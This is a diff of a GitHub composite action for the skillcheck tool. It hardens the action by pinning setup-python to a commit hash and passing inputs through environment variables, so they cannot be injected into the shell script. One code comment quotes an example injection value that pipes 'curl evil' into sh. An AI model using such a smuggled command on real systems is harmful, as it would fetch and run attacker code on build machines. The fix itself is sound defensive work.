@@ -108,17 +108,46 @@ runs:
   using: "composite"
   steps:
     - name: Set up Python
-      uses: actions/setup-python@v5
+      uses: actions/setup-python@a26af69be951a213d495a4c3e4e4022e16d87065 # v5.6.0
       with:
         python-version: "3.12"
 
     - name: Install and run skillcheck
       shell: bash
+      # Inputs are passed through env so their values never expand into the
+      # script source. Referencing them as "$INPUT_*" keeps a value like
+      # `1.0" ; curl evil | sh ; echo "` an inert string instead of injected
+      # shell. Do NOT reference ${{ inputs.* }} directly inside this run block.
+      env:
+        INPUT_VERSION: ${{ inputs.version }}
+        INPUT_TIKTOKEN: ${{ inputs.tiktoken }}
+        INPUT_PATH: ${{ inputs.path }}
+        INPUT_FORMAT: ${{ inputs.format }}
+        INPUT_STRICT_VSCODE: ${{ inputs.strict-vscode }}
+        INPUT_STRICT_CURSOR: ${{ inputs.strict-cursor }}
+        INPUT_STRICT: ${{ inputs.strict }}
+        INPUT_SKIP_DIRNAME_CHECK: ${{ inputs.skip-dirname-check }}
+        INPUT_SKIP_REF_CHECK: ${{ inputs.skip-ref-check }}
+        INPUT_SEMANTIC: ${{ inputs.semantic }}
+        INPUT_ANALYZE_GRAPH: ${{ inputs.analyze-graph }}
+        INPUT_HISTORY: ${{ inputs.history }}
+        INPUT_FAIL_ON_REGRESSION: ${{ inputs.fail-on-regression }}
+        INPUT_EXPLAIN_SCORE: ${{ inputs.explain-score }}
+        INPUT_ACTIVATION_HYPOTHESES: ${{ inputs.activation-hypotheses }}
+        INPUT_MIN_DESC_SCORE: ${{ inputs.min-desc-score }}
+        INPUT_TARGET_AGENT: ${{ inputs.target-agent }}
+        INPUT_MAX_LINES: ${{ inputs.max-lines }}
+        INPUT_MAX_TOKENS: ${{ inputs.max-tokens }}
+        INPUT_INGEST_CRITIQUE: ${{ inputs.ingest-critique }}
+        INPUT_CRITIQUE_AGENT: ${{ inputs.critique-agent }}
+        INPUT_INGEST_GRAPH: ${{ inputs.ingest-graph }}
+        INPUT_GRAPH_AGENT: ${{ inputs.graph-agent }}
+        INPUT_IGNORE: ${{ inputs.ignore }}
       run: |
         # Install strategy:
-        # 1. inputs.version set -> pin to that PyPI version (covers the rare
+        # 1. INPUT_VERSION set -> pin to that PyPI version (covers the rare
         #    case of running an older skillcheck against newer action sources).
-        # 2. inputs.version empty AND $GITHUB_ACTION_PATH/pyproject.toml present
+        # 2. INPUT_VERSION empty AND $GITHUB_ACTION_PATH/pyproject.toml present
         #    -> install from the action's own checkout. This is how composite
         #    actions are laid out by actions/checkout: the tag the user wrote in
         #    `uses:` is checked out into $GITHUB_ACTION_PATH, so installing from
@@ -127,20 +156,20 @@ runs:
         # 3. Otherwise fall back to the PyPI range. This only fires in edge cases
         #    where $GITHUB_ACTION_PATH does not contain a checkout (e.g. a
         #    user-built container that drops the action sources).
-        if [ -n "${{ inputs.version }}" ]; then
-          if [ "${{ inputs.tiktoken }}" = "true" ]; then
-            pip install --quiet "skillcheck[tiktoken]==${{ inputs.version }}"
+        if [ -n "$INPUT_VERSION" ]; then
+          if [ "$INPUT_TIKTOKEN" = "true" ]; then
+            pip install --quiet "skillcheck[tiktoken]==$INPUT_VERSION"
           else
-            pip install --quiet "skillcheck==${{ inputs.version }}"
+            pip install --quiet "skillcheck==$INPUT_VERSION"
           fi
         elif [ -f "${GITHUB_ACTION_PATH}/pyproject.toml" ]; then
-          if [ "${{ inputs.tiktoken }}" = "true" ]; then
+          if [ "$INPUT_TIKTOKEN" = "true" ]; then
             pip install --quiet "${GITHUB_ACTION_PATH}[tiktoken]"
           else
             pip install --quiet "${GITHUB_ACTION_PATH}"
           fi
         else
-          if [ "${{ inputs.tiktoken }}" = "true" ]; then
+          if [ "$INPUT_TIKTOKEN" = "true" ]; then
             pip install --quiet "skillcheck[tiktoken]>=1.2,<2"
           else
             pip install --quiet "skillcheck>=1.2,<2"
@@ -148,29 +177,29 @@ runs:
         fi
 
         args=()
-        args+=("${{ inputs.path }}")
-        args+=("--format" "${{ inputs.format }}")
+        args+=("$INPUT_PATH")
+        args+=("--format" "$INPUT_FORMAT")
 
-        [ "${{ inputs.strict-vscode }}" = "true" ] && args+=("--strict-vscode")
-        [ "${{ inputs.strict-cursor }}" = "true" ] && args+=("--strict-cursor")
-        [ "${{ inputs.strict }}" = "true" ] && args+=("--strict")
-        [ "${{ inputs.skip-dirname-check }}" = "true" ] && args+=("--skip-dirname-check")
-        [ "${{ inputs.skip-ref-check }}" = "true" ] && args+=("--skip-ref-check")
-        [ "${{ inputs.semantic }}" = "true" ] && args+=("--semantic")
-        [ "${{ inputs.analyze-graph }}" = "true" ] && args+=("--analyze-graph")
-        [ "${{ inputs.history }}" = "true" ] && args+=("--history")
-        [ "${{ inputs.fail-on-regression }}" = "true" ] && args+=("--fail-on-regression")
-        [ "${{ inputs.explain-score }}" = "true" ] && args+=("--explain-score")
-        [ "${{ inputs.activation-hypotheses }}" = "true" ] && args+=("--activation-hypotheses")
-        [ -n "${{ inputs.min-desc-score }}" ] && args+=("--min-desc-score" "${{ inputs.min-desc-score }}")
-        [ -n "${{ inputs.target-agent }}" ] && args+=("--target-agent" "${{ inputs.target-agent }}")
-        [ -n "${{ inputs.max-lines }}" ] && args+=("--max-lines" "${{ inputs.max-lines }}")
-        [ -n "${{ inputs.max-tokens }}" ] && args+=("--max-tokens" "${{ inputs.max-tokens }}")
-        [ -n "${{ inputs.ingest-critique }}" ] && args+=("--ingest-critique" "${{ inputs.ingest-critique }}")
-        [ -n "${{ inputs.critique-agent }}" ] && args+=("--critique-agent" "${{ inputs.critique-agent }}")
-        [ -n "${{ inputs.ingest-graph }}" ] && args+=("--ingest-graph" "${{ inputs.ingest-graph }}")
-        [ -n "${{ inputs.graph-agent }}" ] && args+=("--graph-agent" "${{ inputs.graph-agent }}")
-        IFS=',' read -ra PREFIXES <<< "${{ inputs.ignore }}"
+        [ "$INPUT_STRICT_VSCODE" = "true" ] && args+=("--strict-vscode")
+        [ "$INPUT_STRICT_CURSOR" = "true" ] && args+=("--strict-cursor")
+        [ "$INPUT_STRICT" = "true" ] && args+=("--strict")
+        [ "$INPUT_SKIP_DIRNAME_CHECK" = "true" ] && args+=("--skip-dirname-check")
+        [ "$INPUT_SKIP_REF_CHECK" = "true" ] && args+=("--skip-ref-check")
+        [ "$INPUT_SEMANTIC" = "true" ] && args+=("--semantic")
+        [ "$INPUT_ANALYZE_GRAPH" = "true" ] && args+=("--analyze-graph")
+        [ "$INPUT_HISTORY" = "true" ] && args+=("--history")
+        [ "$INPUT_FAIL_ON_REGRESSION" = "true" ] && args+=("--fail-on-regression")
+        [ "$INPUT_EXPLAIN_SCORE" = "true" ] && args+=("--explain-score")
+        [ "$INPUT_ACTIVATION_HYPOTHESES" = "true" ] && args+=("--activation-hypotheses")
+        [ -n "$INPUT_MIN_DESC_SCORE" ] && args+=("--min-desc-score" "$INPUT_MIN_DESC_SCORE")
+        [ -n "$INPUT_TARGET_AGENT" ] && args+=("--target-agent" "$INPUT_TARGET_AGENT")
+        [ -n "$INPUT_MAX_LINES" ] && args+=("--max-lines" "$INPUT_MAX_LINES")
+        [ -n "$INPUT_MAX_TOKENS" ] && args+=("--max-tokens" "$INPUT_MAX_TOKENS")
+        [ -n "$INPUT_INGEST_CRITIQUE" ] && args+=("--ingest-critique" "$INPUT_INGEST_CRITIQUE")
+        [ -n "$INPUT_CRITIQUE_AGENT" ] && args+=("--critique-agent" "$INPUT_CRITIQUE_AGENT")
+        [ -n "$INPUT_INGEST_GRAPH" ] && args+=("--ingest-graph" "$INPUT_INGEST_GRAPH")
+        [ -n "$INPUT_GRAPH_AGENT" ] && args+=("--graph-agent" "$INPUT_GRAPH_AGENT")
+        IFS=',' read -ra PREFIXES <<< "$INPUT_IGNORE"
         for p in "${PREFIXES[@]}"; do
           [ -n "$p" ] && args+=("--ignore" "$(echo "$p" | xargs)")
         done
